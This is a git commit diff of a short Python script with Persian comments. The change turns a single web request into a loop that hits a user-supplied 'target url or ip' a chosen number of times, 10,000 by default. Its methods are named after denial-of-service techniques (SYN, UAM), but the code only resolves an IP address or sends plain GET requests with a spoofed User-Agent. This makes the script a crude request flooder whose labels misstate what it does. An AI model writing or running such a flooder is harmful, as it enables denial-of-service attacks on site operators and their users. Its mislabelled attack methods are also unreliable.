cacf2383bbe6c6e46bda873af19cec6ac291dc2d
Sm3Rr <136627138+Sm3Rr@users.noreply.github.com>
2023-08-30 15:45:10 +0330

    Update ip.py

--- ip.py
+++ ip.py
@@ -1,3 +1,4 @@
+
 import requests
 import socket
 
@@ -9,15 +10,19 @@ def send_request(url, method="GET"):
         response = requests.get(url)
     elif method == "SYN":
         ip = socket.gethostbyname(url)
-        print(" WEBSITE IP ADDRESS : ", ip)
+        print("IP آدرس این وبسایت: ", ip)
         return
     elif method == "UAM":
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}  # یک User-Agent مناسب تهیه کنید
         response = requests.get(url, headers=headers)
-    
+
     print(response.text)  # پاسخ سرور را بررسی کنید
 
-url = input(" Enter The Site Url")
-method = input(" Enter Method (POST/GET/SYN/UAM): ")
+# تعداد ریکوئست را از کاربر دریافت می کنیم
+num_requests = int(input(" Enter count of Requests (def=10000): "))
+url = input(" Enter target url or ip: ")
+method = input(" Enter the method (POST/GET/SYN/UAM): ")
 
-send_request(url, method)
+# ریکوئست ها را ارسال می کنیم
+for i in range(num_requests):
+    send_request(url, method)
